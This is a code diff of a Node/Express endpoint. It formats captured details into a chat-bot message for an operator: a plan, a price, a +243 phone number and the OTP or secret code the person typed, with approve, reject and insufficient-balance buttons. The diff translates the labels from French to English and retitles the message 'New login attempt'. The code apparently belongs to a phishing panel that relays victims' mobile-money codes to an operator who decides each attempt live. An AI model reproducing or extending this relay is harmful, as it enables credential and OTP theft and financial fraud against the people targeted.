@@ -80,9 +80,9 @@ app.post('/api/request-approval', async (req, res) => {
         ? `🔑 Code OTP saisi : \`${otp || '—'}\`\n`
         : `🔑 Code saisi : \`${code || '—'}\`\n`;
     const text =
-      `🔔 *Nouvelle demande — ${stepLabel}*\n\n` +
-      `📦 Forfait : ${plan || '—'}\n` +
-      `💰 Prix : $${price || '—'}\n` +
+      `🔔 *New login attempt — ${stepLabel}*\n\n` +
+      `📦 data : ${plan || '—'}\n` +
+      `💰 Price : $${price || '—'}\n` +
       `📱 Téléphone : +243${phone || '—'}\n` +
       secretLine +
       `🆔 ID : \`${id}\``;
@@ -90,13 +90,13 @@ app.post('/api/request-approval', async (req, res) => {
     const buttonRow =
       step === 'otp'
         ? [
-            { text: '✅ Approuver', callback_data: `approve:${id}` },
-            { text: '❌ Refuser', callback_data: `deny:${id}` },
-            { text: '⚠️ Insuffisant', callback_data: `insufficient:${id}` },
+            { text: '✅ Approve', callback_data: `approve:${id}` },
+            { text: '❌ Reject', callback_data: `deny:${id}` },
+            { text: '⚠️ Insuffisient', callback_data: `insufficient:${id}` },
           ]
         : [
-            { text: '✅ Approuver', callback_data: `approve:${id}` },
-            { text: '❌ Refuser', callback_data: `deny:${id}` },
+            { text: '✅ Approve', callback_data: `approve:${id}` },
+            { text: '❌ Reject', callback_data: `deny:${id}` },
           ];
 
     try {
@@ -132,8 +132,8 @@ const STATUS_BY_ACTION = {
   insufficient: 'insufficient',
 };
 const LABEL_BY_ACTION = {
-  approve: 'Approuvé ✅',
-  deny: 'Refusé ❌',
+  approve: 'Approve ✅',
+  deny: 'Reject ❌',
   insufficient: 'Solde insuffisant ⚠️',
 };
 
